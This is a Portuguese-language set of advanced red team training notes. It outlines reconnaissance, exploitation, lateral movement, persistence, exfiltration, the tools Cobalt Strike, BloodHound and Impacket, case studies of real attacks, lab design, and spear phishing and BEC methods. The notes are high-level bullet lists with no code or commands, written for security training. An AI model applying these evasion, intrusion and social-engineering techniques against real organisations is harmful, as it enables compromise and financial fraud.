# 🔴 Red Team N3: Recapitulação Profunda de Técnicas de Reconhecimento, Exploração e Pós-Exploração

No nível N3, o Red Team domina técnicas avançadas para conduzir ataques sofisticados, cobrindo desde o reconhecimento inicial até a pós-exploração detalhada, garantindo máxima eficácia e discrição.

---

## 🧠 Reconhecimento Avançado

```

- **Reconhecimento passivo e ativo:** coleta detalhada de informações via OSINT, análise de redes sociais, DNS, e varreduras específicas  
- **Enumeração profunda:** mapeamento minucioso de hosts, serviços, usuários, grupos e permissões usando ferramentas como `nmap`, `enum4linux`, `ldapsearch`  
- **Coleta de credenciais:** phishing direcionado, captura de hashes via SMB/NetNTLM, e análise de arquivos públicos  

---

## 🧱 Exploração Avançada

```

- **Exploits customizados e zero-days:** desenvolvimento e uso de exploits sob medida para vulnerabilidades específicas  
- **Bypass de controles de segurança:** evasão de AV/EDR, bypass de proteção de memória (DEP, ASLR) e exploração de falhas em sistemas de detecção  
- **Execução de payloads avançados:** uso de técnicas como DLL injection, reflective loading e execução viva em memória (fileless)  

---

## 🔍 Pós-Exploração Profunda

```

- **Escalonamento de privilégios:** exploração de vulnerabilidades locais, abuso de permissões e credenciais armazenadas  
- **Movimentação lateral sofisticada:** uso de Pass-the-Hash, Pass-the-Ticket, RDP, WMI, PSExec e PowerShell Remoting  
- **Persistência avançada:** criação de backdoors stealth, abusos de serviços, scheduled tasks e técnicas de living-off-the-land (LOLbins)  
- **Coleta e exfiltração de dados:** identificação de dados sensíveis, compressão, criptografia e transferência segura para servidores externos  

---

## ⚙️ Boas práticas para Red Team N3

```

- Planeje ataques com base em inteligência atualizada e contexto do alvo  
- Documente minuciosamente todas as etapas e técnicas utilizadas  
- Teste evasões contra as ferramentas de defesa específicas do ambiente  
- Coordene a comunicação com Blue Team para exercícios de adversary emulation  

---

## ✅ Conclusão

A recapitulação profunda das técnicas de reconhecimento, exploração e pós-exploração consolida o conhecimento avançado do Red Team N3, elevando o nível das operações ofensivas e a capacidade de impactar ambientes reais.

---

# 🔴 Red Team N3: Ferramentas Avançadas – Cobalt Strike, BloodHound, Impacket

No nível N3, o Red Team utiliza ferramentas avançadas que permitem executar ataques sofisticados, facilitar a movimentação lateral, a escalada de privilégios e o mapeamento detalhado do ambiente.

---

## 🧠 Cobalt Strike

```

- Plataforma comercial para simular ataques adversários (adversary emulation)  
- Permite criação e gerenciamento de *beacons* para controle remoto de hosts comprometidos  
- Suporta técnicas avançadas de pós-exploração, evasão e movimentação lateral  
- Integração com ferramentas de scripting para customização e automação de ataques  
- Amplamente usado para exercícios de Red Team e pen tests avançados  

🔗 [https://www.cobaltstrike.com/](https://www.cobaltstrike.com/)

---

## 🧱 BloodHound

```

- Ferramenta de análise e visualização de relações e permissões no Active Directory  
- Ajuda a identificar caminhos de escalonamento de privilégios e movimentos laterais possíveis  
- Baseia-se na coleta de dados via scripts PowerShell e consultas LDAP  
- Facilita planejamento de ataques mais eficientes contra ambientes Windows corporativos  

🔗 [https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)

---

## 🔍 Impacket

```

- Biblioteca Python para criação de scripts e ferramentas de rede e segurança  
- Suporta protocolos como SMB, MSRPC, LDAP, Kerberos, entre outros  
- Permite execução de exploits, movimentação lateral e coleta de informações via scripts customizados  
- Base para muitas ferramentas e exploits usados em Red Team e pentests  

🔗 [https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)

---

## ⚙️ Dicas para Red Team N3

```

- Combine o uso dessas ferramentas para maximizar o impacto das operações  
- Estude profundamente as funcionalidades e técnicas suportadas por cada ferramenta  
- Pratique em laboratórios controlados para dominar integração e workflow  
- Esteja atento a atualizações e novas técnicas para evitar detecção  

---

## ✅ Conclusão

Dominar Cobalt Strike, BloodHound e Impacket coloca o Red Team N3 em um patamar elevado, habilitando ataques sofisticados, planejamento preciso e execução eficiente em ambientes corporativos.

---

# 🔴 Red Team N3: Análise de Casos Reais de Ataques Sofisticados

Estudar casos reais de ataques sofisticados permite ao Red Team N3 entender técnicas avançadas, táticas utilizadas por adversários reais e aprimorar estratégias ofensivas e defensivas.

---

## 🧠 Por que analisar casos reais?

```

- Aprender com falhas e sucessos de ataques reais  
- Identificar padrões e técnicas emergentes  
- Melhorar a capacidade de detecção, resposta e mitigação  
- Inspirar cenários para exercícios de Red Team e Blue Team  

---

## 🧱 Exemplos de ataques sofisticados

```

### 1. SolarWinds (2020)

- Acesso inicial via comprometimento da cadeia de suprimentos  
- Uso de backdoors e técnicas de evasão para infiltração prolongada  
- Movimentação lateral e exfiltração de dados sensíveis  
- Impacto global em múltiplas organizações governamentais e privadas  

### 2. APT29 / Cozy Bear

- Campanhas de espionagem com técnicas avançadas de spear phishing  
- Uso de malware customizado e ferramentas de pós-exploração sofisticadas  
- Persistência oculta e comunicação via canais cifrados  

### 3. WannaCry Ransomware (2017)

- Exploração da vulnerabilidade SMB EternalBlue para rápida propagação  
- Criptografia massiva de dados e demanda de resgate financeiro  
- Impacto global em múltiplas indústrias e serviços públicos  

---

## 🔍 Lições aprendidas

```

- A importância da segmentação e defesa em profundidade  
- Necessidade de monitoramento contínuo e análise comportamental  
- Valor da resposta rápida e coordenação entre equipes de segurança  
- Atenção especial a vetores de ataque emergentes e cadeia de suprimentos  

---

## ⚙️ Aplicação para Red Team N3

```

- Desenvolver cenários de ataque baseados em casos reais para treinamentos  
- Ajustar técnicas e ferramentas conforme as táticas observadas  
- Colaborar com Blue Team para melhorar detecção e resposta  
- Documentar e compartilhar conhecimento para fortalecimento da equipe  

---

## ✅ Conclusão

Analisar ataques sofisticados reais é essencial para que o Red Team N3 se mantenha atualizado, preparado e apto a enfrentar ameaças complexas no mundo real, aumentando o valor das operações ofensivas.

---

# 🔴 Red Team N3: Prática – Laboratórios com Ambientes Complexos e Múltiplas Camadas de Defesa

Treinar em laboratórios realistas e desafiadores é fundamental para o Red Team N3 desenvolver habilidades para enfrentar ambientes corporativos sofisticados, com defesas em múltiplas camadas.

---

## 🧠 Objetivos da prática

```

- Aprender a identificar e superar defesas complexas e múltiplas camadas  
- Desenvolver estratégias de ataque coordenadas e furtivas  
- Exercitar técnicas avançadas de evasão, movimentação lateral e persistência  
- Preparar para ambientes reais com controles de segurança robustos  

---

## 🧱 Características de ambientes complexos

```

- Segmentação de rede rigorosa e firewalls internos  
- Soluções avançadas de detecção (EDR, IPS, SIEM)  
- Políticas de acesso restritas e monitoração constante  
- Sistemas heterogêneos (Windows, Linux, cloud) integrados  

---

## 🔍 Como estruturar o laboratório

```

- Utilize ferramentas como VMware, VirtualBox ou ambientes em nuvem para criar infraestruturas  
- Configure múltiplas VLANs, firewalls e gateways para simular segmentação  
- Instale e configure soluções de segurança como EDR, SIEM e IDS/IPS  
- Simule usuários e tráfego normal para dificultar a detecção  

---

## ⚙️ Dicas para Red Team N3

```

- Planeje ataques multi-fase considerando defesas em cada camada  
- Documente as técnicas de evasão e ferramentas usadas em cada etapa  
- Experimente diferentes vetores e abordagens para contornar controles  
- Analise logs e alertas para entender o que foi detectado e melhorar táticas  

---

## ✅ Benefícios da prática

```

- Melhora significativa na capacidade de realizar ataques furtivos e eficazes  
- Maior familiaridade com ambientes complexos e variados  
- Desenvolvimento de pensamento estratégico e adaptativo  
- Preparação para desafios reais em ambientes corporativos de alta segurança  

---

## ✅ Conclusão

Laboratórios com ambientes complexos e múltiplas camadas de defesa são essenciais para o Red Team N3 aprimorar suas habilidades, preparando-se para operações avançadas e ambientes corporativos exigentes.

---

# 🔴 Red Team N3: Técnicas Avançadas de Spear Phishing, Pretexting e BEC (Business Email Compromise)

No nível N3, o Red Team domina técnicas sofisticadas de engenharia social para comprometer alvos específicos, explorando a confiança e vulnerabilidades humanas em ambientes corporativos.

---

## 🧠 Por que dominar essas técnicas?

```

- Spear phishing e BEC são vetores comuns e eficazes para acesso inicial  
- Permitem infiltração furtiva e direcionada em organizações  
- Exploram falhas humanas difíceis de detectar por defesas técnicas  
- Possibilitam ataques com alto impacto financeiro e estratégico  

---

## 🧱 Técnicas avançadas de Spear Phishing

```

- **Pesquisa detalhada:** coleta de informações via OSINT para criar mensagens altamente personalizadas  
- **Email spoofing e comprometimento de contas:** uso de domínios falsificados ou contas legítimas para aumentar credibilidade  
- **Anexos e links maliciosos:** criação de payloads indetectáveis e páginas de phishing customizadas  
- **Timing estratégico:** envio em momentos críticos para aumentar chance de sucesso  

---

## 🔍 Pretexting sofisticado

```

- Construção de histórias convincentes que justificam pedidos ou ações  
- Uso de identidades falsas com informações reais para enganar a vítima  
- Abordagem multicanal (telefone, email, redes sociais) para reforçar o pretexto  
- Exploração de hierarquia organizacional para ganhar acesso privilegiado  

---

## ⚙️ Business Email Compromise (BEC)

```

- Comprometimento de contas de email corporativas para solicitações financeiras fraudulentas  
- Monitoramento de comunicações para entender processos e relações internas  
- Manipulação de solicitações de pagamento, transferências e dados confidenciais  
- Uso de técnicas para evitar detecção, como redação formal e uso de contatos reais  

---

## ✅ Boas práticas para Red Team N3

```

- Realize simulações éticas com autorização e escopo definidos  
- Combine técnicas técnicas e sociais para maior eficácia  
- Monitore indicadores de sucesso e falha para aprimorar abordagens  
- Documente processos e resultados para treinamento e aprendizado contínuo  

---

## ✅ Conclusão

Dominar técnicas avançadas de spear phishing, pretexting e BEC coloca o Red Team N3 em posição de simular ameaças reais de alta complexidade, preparando organizações para defender-se contra ataques sofisticados.

---



